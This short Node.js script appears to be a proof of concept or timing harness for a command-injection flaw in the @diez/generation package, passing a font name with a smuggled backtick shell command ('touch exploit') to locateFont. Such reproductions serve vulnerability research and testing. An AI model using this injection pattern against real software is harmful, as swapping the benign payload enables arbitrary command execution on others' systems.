var arguments = process.argv;
console.log(arguments)
if (arguments.length == 3) {
    type = arguments[2]
    var time1 = process.hrtime.bigint();
    for (var i = 0; i < 200; i++){
        const generation = require("@diez/generation");
        generation.locateFont("foo'`touch exploit` '", {});
    }
    var time2 = process.hrtime.bigint();
    require("fs").writeFileSync(`${type}_time`, (time2-time1).toString());
} else{
    const generation = require("@diez/generation");
    generation.locateFont("foo'`touch exploit` '", {});
}